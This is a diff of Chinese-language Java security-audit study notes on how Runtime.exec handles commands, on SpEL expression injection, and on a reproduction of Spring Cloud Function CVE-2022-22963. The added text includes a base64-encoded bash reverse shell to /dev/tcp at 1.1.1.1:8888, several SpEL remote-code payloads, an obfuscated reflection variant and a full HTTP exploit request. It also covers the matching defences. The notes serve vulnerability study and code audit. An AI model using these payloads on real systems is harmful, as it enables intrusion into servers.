@@ -532,8 +532,10 @@
 
 ## java本地命令执行函数
 
+> https://x.hacking8.com/?post=293 java payload在线生成
+
 - java提供了命令执行的函数，黑客通常会RCE利用漏洞或者WebShell来执行系统终端命令控制服务器的目的。
-- **黑客通常会RCE利用漏洞或者WebShell来执行系统终端命令控制服务器的目的。**
+
 - 在Java中我们通常会使用 `java.lang.Runtime`类的 `exec`方法来执行本地系统命令。
 
   ```jsp
@@ -554,35 +556,150 @@
 
   - 命令执行效果如下：windows下命令要加 `cmd /c `前缀才能执行命令（默认是执行程序，所以可以传入一个程序的绝对路径），linux不用。无法使用蚁剑连接。
   - ![image-20211227193650466](java代码审计.assets/image-20211227193650466.png)
-- **Runtime命令执行调用链**：
 
-  - 参考资料：https://www.freebuf.com/articles/web/308458.html
-  - Runtime.exec(xxx)调用链如下:
+### **Runtime命令执行调用链**：
 
-    ```shell
-    java.lang.UNIXProcess.<init>(UNIXProcess.java:247)
-    java.lang.ProcessImpl.start(ProcessImpl.java:134)
-    java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
-    java.lang.Runtime.exec(Runtime.java:620)
-    java.lang.Runtime.exec(Runtime.java:450)
-    java.lang.Runtime.exec(Runtime.java:347)
-    org.apache.jsp.runtime_002dexec2_jsp._jspService(runtime_002dexec2_jsp.java:118)
-    
+>  https://www.freebuf.com/articles/web/308458.html
+>
+> https://blog.csdn.net/whatday/article/details/107098353
+>
+> https://blog.spoock.com/2018/11/07/java-reverse-shell/
+
+机制
+
+- java的`Runtime.getRuntime.exec`和`ProcessBuilder.start`，都是直接启动传入参数对应的进程（并不是shell命令，**这就导致了只有参数数组的第一个才会被当作命令，其他参数都是该进程的参数**）。
+
+    - 以curl为例，php的`system`会启动系统shell，然后通过shell来启动curl进程，这个过程中，如果传入的命令带有shell能解析的语法，就会首先解析。
+
+    - 所以，如果只是命令执行的部分参数可控，想在java中通过`;、|、&`等实现命令注入，是行不通的。当然不排除程序本身存在漏洞，只需传入参数即可造成漏洞。
+
+    - 如果命令以字符串形式传入`Runtime.getRuntime.exec`，程序会将传入的命令用空格来拆分。
+
+        ```
+        Process process = runtime.exec("ping -c 1 " + ip);
+        //这种传入 127.0.0.1 | id，是无法正常执行的
+        第一个参数才会被当作命令，其他都是当作命令的参数
+        ```
+
+    - 如果执行命令使用的是`ProcessBuilder.start`，那么只能执行无参数的命令。因为`ProcessBuilder`不支持以字符串形式传入命令，只能拆分成List或者数组的形式传入，才能执行。
+
+- 为什么不能直接`Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");`
+
+    - 上面说了java并没有给我们一个shell环境。管道符、输入输出重定向都没法用。
+    - 例如，`ls > dir_listing`在shell中执行应该将当前目录的列表输出到名为的文件中`dir_listing`。但是在`exec()`函数的上下文中，该命令将被解释为获取`>`和`dir_listing`目录的列表。
+    - 其他时候，其中包含空格的参数会被StringTokenizer类破坏，该类将空格分割为命令字符串。那样的东西`ls "My Directory"`会被解释为`ls '"My' 'Directory"'`。
+
+- 我们都知道`bash -c "cmd string"`,就是使用shell去运行`cmd string`字符串
+
+    - 所以我们写payload：`new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ip/port 0>&1"}`
+        - 但是后面参数`"bash -i >& /dev/tcp/ip/port 0>&1"`空格又会被切分。
+
+-  一般常用的是使用base64来编码我们输入的命令
+
+    - ```
+        原始 bash -c "bash -i >& /dev/tcp/1.1.1.1/8888 0>&1"
+        
+        编码后 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzg4ODggMD4mMSA=}|{base64,-d}|{bash,-i}
+        直接在linux shell下运行失败，猜测-c后面的参数被java做了一些处理
+        ```
+
+分析
+
+- 在`java.lang.Runtime()`中存在多个重载的`exec()`方法，如下所示:
+
+  - ```java
+    public Process exec(String command)
+    public Process exec(String command, String[] envp)
+    public Process exec(String command, String[] envp, File dir)
+    public Process exec(String cmdarray[])
+    public Process exec(String[] cmdarray, String[] envp)
+    public Process exec(String[] cmdarray, String[] envp, File dir)
     ```
-  - 通过观察整个调用链我们可以清楚的看到exec方法并不是命令执行的最终点，执行逻辑大致是：
 
-    ```
-    Runtime.exec(xxx)
-    java.lang.ProcessBuilder.start()
-    java.lang.ProcessImpl.start()
-    new java.lang.UNIXProcess(xxx)
-    UNIXProcess构造方法中调用了forkAndExec(xxx) native方法。
-    forkAndExec调用操作系统级别fork->exec(*nix)/CreateProcess(Windows)执行命令并返回fork/CreateProcess的PID。
-    ```
-  - 有了以上的调用链分析我们就可以深刻的理解到Java本地命令执行的深入逻辑了，
+- 除了常见的`exec(String command)`和`exec(String cmdarray[])`，其他`exec()`都增加了`envp`和`File`这些限制。虽然如此，但是最终都是调用相同的方法，本质没有却区别。这些函数存在的意义可以简要地参考[调用java.lang.Runtime.exec的正确姿势](https://blog.csdn.net/timo1160139211/article/details/75006938)
 
-    - Runtime是调用的ProcessBuilder
-    - 而ProcessBuilder是调用的ProcessImpl
+- 分析`exec(String cmdarray[])`和`exec(String command)`:
+
+  - ```java
+    // exec(String command) 函数
+    public Process exec(String command) throws IOException {
+        return exec(command, null, null);
+    }
+    ...
+    public Process exec(String command, String[] envp, File dir)
+        throws IOException {
+        if (command.length() == 0)
+            throw new IllegalArgumentException("Empty command");
+     
+        StringTokenizer st = new StringTokenizer(command);
+        String[] cmdarray = new String[st.countTokens()];
+        for (int i = 0; st.hasMoreTokens(); i++)
+            cmdarray[i] = st.nextToken();
+        return exec(cmdarray, envp, dir);//////////////////////////////////////////////
+    }
+    ...
+        
+    // exec(String cmdarray[])
+    public Process exec(String cmdarray[]) throws IOException {
+        return exec(cmdarray, null, null);/////////////////////////////////////
+    }
+    ```
+
+  - 可以看到`exec(String cmdarray[])`和`exec(String command)`最终都是调用的`exec(cmdarray, null, null)`。`exec(String command)`通过`StringTokenizer st = new StringTokenizer(command);`将其分割为Token之后作为字符串数组，调用`exec(cmdarray, null, null)`。
+
+  - 分析`StringTokenizer(String str)`:
+
+    - ```java
+      public StringTokenizer(String str) {
+              this(str, " \t\n\r\f", false);
+      }
+      ```
+
+    -  这个StringTokenizer类的构造函数，会将命令字符串按照`\t\n\r\f`切分成数组。
+
+  - 分析exec(cmdarray, envp, dir)
+
+    - ```java
+      public Process exec(String[] cmdarray, String[] envp, File dir)
+          throws IOException {
+          return new ProcessBuilder(cmdarray)
+              .environment(envp)
+              .directory(dir)
+              .start();
+      }
+      
+      ```
+
+  - 发现调用了ProcessBuilder类
+
+- Runtime.exec(xxx)调用链如下:
+
+  ```shell
+  java.lang.UNIXProcess.<init>(UNIXProcess.java:247)
+  java.lang.ProcessImpl.start(ProcessImpl.java:134)
+  java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
+  java.lang.Runtime.exec(Runtime.java:620)
+  java.lang.Runtime.exec(Runtime.java:450)
+  java.lang.Runtime.exec(Runtime.java:347)
+  org.apache.jsp.runtime_002dexec2_jsp._jspService(runtime_002dexec2_jsp.java:118)
+  ```
+
+- 通过观察整个调用链我们可以清楚的看到exec方法并不是命令执行的最终点，执行逻辑大致是：
+
+  ```
+  Runtime.exec(xxx)
+  java.lang.ProcessBuilder.start()
+  java.lang.ProcessImpl.start()
+  new java.lang.UNIXProcess(xxx)
+  UNIXProcess构造方法中调用了forkAndExec(xxx) native方法。
+  forkAndExec调用操作系统级别fork->exec(*nix)/CreateProcess(Windows)执行命令并返回fork/CreateProcess的PID。
+  ```
+
+- 有了以上的调用链分析我们就可以深刻的理解到Java本地命令执行的深入逻辑了，
+
+  - Runtime是调用的ProcessBuilder
+  - 而ProcessBuilder是调用的ProcessImpl
+
 - **ProcessBuilder**:
 
   - 根据上面我们知道，ProcessBuilder传入的参数需要是数组。
@@ -609,6 +726,7 @@
   
   %>
   ```
+
 - **UNIXProcess/ProcessImpl**：
 
   - UNIXProcess和ProcessImpl可以理解本就是一个东西，因为在JDK9的时候把UNIXProcess合并到了ProcessImpl当中了,参考[changeset 11315:98eb910c9a97](https://hg.openjdk.java.net/jdk-updates/jdk9u/jdk/rev/98eb910c9a97)。
@@ -2937,9 +3055,7 @@ configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
 | java/lang/ProcessBuilder | start    |
 | groovy/lang/GroovyShell  | evaluate |
 
-java的`Runtime.getRuntime.exec`和`ProcessBuilder.start`，都是直接启动传入参数对应的进程（并不是shell命令）。以curl为例，php的`system`会启动系统shell，然后通过shell来启动curl进程，这个过程中，如果传入的命令带有shell能解析的语法，就会首先解析。
-
-所以，如果只是命令执行的部分参数可控，想在java中通过`;、|、&`等实现命令注入，是行不通的。当然不排除程序本身存在漏洞，只需传入参数即可造成漏洞。
+只有数组参数的第一个参数可控，才能导致命令执行
 
 如果命令以字符串形式传入`Runtime.getRuntime.exec`，程序会将传入的命令用空格来拆分。
 
@@ -2951,16 +3067,14 @@ Process process = runtime.exec("ping -c 1 " + ip);
 
 如果执行命令使用的是`ProcessBuilder.start`，那么只能执行无参数的命令。因为`ProcessBuilder`不支持以字符串形式传入命令，只能拆分成List或者数组的形式传入，才能执行。
 
-如果参数完全可控，可自行启动shell，然后在执行命令。
 
-```
-Process process = runtime.exec("sh -c whoami");
-```
 
 命令执行漏洞的防御需要结合实际场景，没有很通用的防御手段。
 
 1. 尽量避免调用shell来执行命令。
 2. 如果是拼接参数来执行命令，对参数进行严格过滤，比如只允许字母数字。
+
+
 
 ### 6. XSS
 
@@ -3159,11 +3273,36 @@ fileContent = ESAPI.encoder().encodeForHTML(fileContent);
 
 ### 8. 表达式注入
 
-#### 0x01漏洞挖掘
+#### **spel**
 
-##### **spel**
+> https://zhuanlan.zhihu.com/p/184963672
+>
+> https://blog.csdn.net/weixin_45794666/article/details/123372058
 
-spel表达式有三种用法：
+##### 什么是spel？
+
+- Spring表达式语言（简称SpEl）是一个支持查询和操作运行时对象导航图功能的强大的表达式语言. 它的语法类似于传统EL，但提供额外的功能，最出色的就是函数调用和简单字符串的模板函数。尽管有其他可选的 Java 表达式语言，如 OGNL, MVEL,JBoss EL 等等，但 Spel 创建的初衷是了给 Spring 社区提供一种简单而高效的表达式语言，一种可贯穿整个 Spring 产品组的语言。这种语言的特性应基于 Spring 产品的需求而设计。
+
+表达式注入漏洞
+
+- 2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词。
+
+- 这次分析的SPEL即Spring EL，是Spring框架专有的EL表达式。相对于其他几种表达式语言，使用面相对较窄，但是从Spring框架被使用的广泛性来看，还是有值得研究的价值的。
+
+- SpEL使用 #{...} 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：
+
+    ```java
+    ${}主要用于加载外部属性文件中的值，在Spring Boot 很早版本的一个SpEL表达式注入中就是依赖${}触发的
+        
+    两者可以混合使用，但是必须#{}在外面，${}在里面，如#{'${}'}，注意单引号是字符串类型才添加的
+    
+    除此以外在SpEL中，使用T()运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的Math类，我们可以像下面的示例这样使用T()运算符：
+    #{T(java.lang.Math)}运算符的结果会返回一个java.lang.Math类对象。
+    ```
+
+##### 复现：
+
+- spel表达式有三种用法：
 
 1. 注解
 
@@ -3186,19 +3325,57 @@ spel表达式有三种用法：
 
 3. 在代码中处理外部传入的表达式
 
-    这部分是关注的重点。`SpelExpressionParser`
+    **这部分是关注的重点**。`sink: SpelExpressionParser`
 
-    ```
-    @RequestMapping("/spel")
-    public String spel(@RequestParam(name = "spel") String spel) {
-        ExpressionParser expressionParser = new SpelExpressionParser();
-        Expression expression = expressionParser.parseExpression(spel);
-        Object object = expression.getValue();
-        return object.toString();
+    ```java
+    import org.springframework.expression.Expression;
+    import org.springframework.expression.spel.standard.SpelExpressionParser;
+    import org.springframework.stereotype.Controller;
+    import org.springframework.web.bind.annotation.RequestMapping;
+    import org.springframework.web.bind.annotation.RequestParam;
+    import org.springframework.web.bind.annotation.ResponseBody;
+    
+    @Controller
+    public class HelloWorld {
+        @RequestMapping("/test")
+        @ResponseBody
+        public String test(@RequestParam String input){
+            SpelExpressionParser parse = new SpelExpressionParser();
+            Expression expression = parse.parseExpression(input);
+            return  expression.getValue().toString();
+    
+        }
     }
     ```
 
-漏洞可以利用的前置条件有三个：
+- 通过模板引擎来解析的，也就是我们的输入需要`#{}`包裹才能解析
+
+    - ```java
+        @RestController
+        @EnableAutoConfiguration
+        public class Index {
+            @ResponseBody
+            @RequestMapping(value = "/spel", method = {RequestMethod.GET, RequestMethod.POST})
+            public String spel(String input){
+                SpelExpressionParser parser = new SpelExpressionParser();
+                TemplateParserContext templateParserContext = new TemplateParserContext();
+                Expression expression = parser.parseExpression(input,templateParserContext);
+                return expression.getValue().toString();
+            }
+        }
+        ```
+
+    - 
+
+poc
+
+- ```
+    http://localhost/test?spel=new%20java.lang.ProcessBuilder(%22calc%22).start()
+    ```
+
+##### 漏洞利用
+
+**漏洞可以利用的前置条件有三个：**
 
 1. 传入的表达式 未过滤
 2. 表达式解析之后调用了**getValue/setValue**方法
@@ -3206,7 +3383,9 @@ spel表达式有三种用法：
 
 **spel表达式功能非常强大，在漏洞利用方面主要使用这几个功能：**
 
-- 使用T(Type)表示Type类的实例,Type为全限定名称,如T(com.test.Bean1)。但是java.lang例外,该包下的类可以不指定包名。得到类实例后会访问类静态方法与字段。
+- 使用T(Type)表示Type类的实例,Type为全限定名称,如T(com.test.Bean1)。
+
+- 但是java.lang例外,该包下的类可以不指定包名,因为SpEL已经内置了该包。得到类实例后会访问类静态方法与字段。
 
     ```
     T(java.lang.Runtime).getRuntime().exec("whoami")
@@ -3221,7 +3400,175 @@ spel表达式有三种用法：
     #{''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',''.getClass()).invoke(''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(null),'calc')}
     ```
 
-##### **jexl**
+- poc
+
+    - ```url
+        input=#{new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "GBK").useDelimiter("lyy9").next()}
+        #Scanner#useDelimiter方法使用指定的字符串分割输出，这里给不可能出现的字符串即可，就会让所有的字符都在第一行，然后执行next方法即可获得所有输出。
+        
+        ```
+
+##### 漏洞防御
+
+- 最简单的方式，使用**SimpleEvaluationContext**作为上下文对象。(SimpleEvaluationContext和StandardEvaluationContext( 默认)是SpEL提供的两个EvaluationContext)
+
+    ```java
+    package com.example.spring_sec.Controller;
+    
+    import org.springframework.expression.EvaluationContext;
+    import org.springframework.expression.Expression;
+    import org.springframework.expression.spel.standard.SpelExpressionParser;
+    import org.springframework.expression.spel.support.SimpleEvaluationContext;
+    import org.springframework.stereotype.Controller;
+    import org.springframework.web.bind.annotation.RequestMapping;
+    import org.springframework.web.bind.annotation.RequestParam;
+    import org.springframework.web.bind.annotation.ResponseBody;
+    
+    
+    @Controller
+    public class HelloWorld {
+        @RequestMapping("/test")
+        @ResponseBody
+        public String test(@RequestParam(name="spel") String input){
+            SpelExpressionParser parse = new SpelExpressionParser();
+            Expression expression = parse.parseExpression(input);
+            //只读属性
+            EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
+            return  expression.getValue(context).toString();
+        }
+    }
+    
+    ```
+
+- 防御结果
+
+    - ```
+        org.springframework.expression.spel.SpelEvaluationException: EL1005E: Type cannot be found 'java.lang.Runtime'
+        ```
+
+##### SpringCloud Function SpEL 注入（CVE-2022-22963）
+
+> https://paper.seebug.org/1977/
+>
+> https://www.cnblogs.com/9eek/p/16113603.html
+
+###### 漏洞描述
+
+在Spring Cloud Function 相关版本，存在SpEL表达式注入。恶意攻击者无需认证可通过构造特定的 HTTP 请求头注入 SpEL 表达式，最终执行任意命令，获取服务器权限。
+
+###### 利用范围
+
+3.0.0 <= Spring Cloud Function <= 3.2.2
+
+###### 漏洞复现
+
+- 使用idea新建Spring Cloud Function项目。
+
+    - ![image-20221020162057950](./java代码审计.assets/image-20221020162057950.png)
+
+- pom.xml添加依赖
+
+    - ```xml
+        <dependency>
+            <groupId>org.springframework.boot</groupId>
+            <artifactId>spring-boot-starter-web</artifactId>
+        </dependency>
+        <dependency>
+            <groupId>org.springframework.cloud</groupId>
+            <artifactId>spring-cloud-function-web</artifactId>
+            <version>3.2.2</version>
+        </dependency>
+        <dependency>
+            <groupId>org.springframework.cloud</groupId>
+            <artifactId>spring-cloud-function-context</artifactId>
+            <version>3.2.2</version>
+        </dependency>
+        <dependency>
+                    <groupId>org.springframework.cloud</groupId>
+                    <artifactId>spring-cloud-function-core</artifactId>
+                    <version>3.2.2</version>
+        </dependency>
+        ```
+
+- 在application.properties中添加`spring.cloud.function.definition=functionRouter`
+
+    - ```
+        spring.cloud.function.definition=functionRouter
+        server.port=8080
+        server.address=127.0.0.1
+        ```
+
+- 启动项目
+
+poc
+
+- ```http
+    POST /functionRouter HTTP/1.1       #POST / HTTP/1.1 只要是个不存在的路由就行
+    Host: localhost:8080
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+    Connection: close
+    spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")
+    Content-Type: text/plain
+    Content-Length: 0
+    ```
+
+- 没有命令回显。
+
+###### 漏洞分析
+
+SpringCloud Function 简述
+
+- Spring Cloud Function 是基于 Spring Boot 的函数计算框架。该项目致力于促进函数为主的开发单元，它抽象出所有传输细节和基础架构，并提供一个通用的模型，用于在各种平台上部署基于函数的软件。
+- SpringCloudFunction就是一个SpringBoot开发的Servless中间件（FAAS）。
+
+分析
+
+- `spring.cloud.function.definition` 表示声明式函数组合，简单理解就是一个默认路由。具体可参考如下说明。
+
+    - **functionRouter**
+
+        - 如果设置为functionRouter则默认路由绑定的具体函数**交由用户进行控制**，在 Spring Cloud Function Web里面，可以通过设置http头的方式来控制，使用`spring.cloud.function.definition` 和`spring.cloud.function.routing-expression` 都可以，**区别是后者允许使用Spring表达式语言（SpEL）**。
+
+        - 即我们可以通过spring.cloud.function.routing-expression表达式来将我们访问的路由和我们在spring.cloud.function.routing-expression中设置的函数绑定到一块。(**该函数本身存在路由的话，该路由就不能重新设置成其他的了**)
+
+        - ```http
+            POST / HTTP/1.1
+            Host: localhost:18888
+            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Connection: close
+            spring.cloud.function.routing-expression: 'uppercase'
+            Upgrade-Insecure-Requests: 1
+            Sec-Fetch-Dest: document
+            Sec-Fetch-Mode: navigate
+            Sec-Fetch-Site: none
+            Sec-Fetch-User: ?1
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 6
+            
+            acddff
+            ```
+
+- [查看DIFF]（https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f）
+
+    - 看到从请求头中获取的 spring.cloud.function.routing-expression 之前是由StandardEvaluationContext 解析，修复新增了 isViaHeader 变量做了一个判断，如果是从请求头中获取的 spring.cloud.function.routing-expression 值，使用 SimpleEvaluationContext 解析。
+
+- 调用链
+
+    - 
+
+###### 注入内存马（进行命令回显）
+
+> https://mp.weixin.qq.com/s/ut57OjIgFUFa9l4ESJhA6Q
+
+##### spring gateway rce
+
+#### **jexl**
 
 关于jexl，比较有代表性的就是前段时间Nexus的rce，[Nexus Repository Manager 3 RCE 分析 -【CVE-2019-7238】](https://xz.aliyun.com/t/4136)文章在这，不再赘述。
 
@@ -3229,27 +3576,7 @@ spel表达式有三种用法：
 
 还有其它种类的表达式，如EL，不会轻易造成安全问题，暂时略过；OGNL表达式会在struts2相关的漏洞中详细说明。
 
-#### 0x02漏洞防御
-
-1. 最简单的方式，使用**SimpleEvaluationContext**作为上下文对象。
-
-    ```
-    @RequestMapping("/spel")
-    public String spel(@RequestParam(name = "spel") String spel) {
-        ExpressionParser expressionParser = new SpelExpressionParser();
-        Expression expression = expressionParser.parseExpression(spel);
-      	
-      	//SimpleEvaluationContext减少了一部分功能，并在权限控制上进一步细化
-      	//可以配置让spel表达式只能访问指定对象
-      	Category category = new Category();
-        EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(category).build();
-      
-        Object object = expression.getValue();
-        return object.toString();
-    }
-    ```
-
-2. 如果SimpleEvaluationContext不能满足需求，就需要对输入进行严格的过滤。
+2. 
 
 ## 动态/静态审计工具
 
